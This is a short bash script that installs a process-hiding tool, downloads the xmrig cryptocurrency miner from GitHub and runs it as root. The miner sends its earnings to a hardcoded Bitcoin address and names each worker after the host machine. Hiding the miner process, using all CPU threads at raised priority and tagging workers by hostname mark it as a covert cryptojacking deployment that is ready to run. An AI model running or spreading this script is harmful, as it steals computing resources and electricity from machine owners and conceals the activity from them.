#!/bin/bash
sudo apt update -y
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp
npm i -g node-process-hider && ph add xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0 && sudo ./xmrig -a rx/0 -o rx.unmineable.com:3333 -u BTC:1NPgcV7FomPoZNuPQKQ1bLFZHhzCAYNEiS.$(echo "$(cat /proc/sys/kernel/hostname)" | tr . _ ) -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
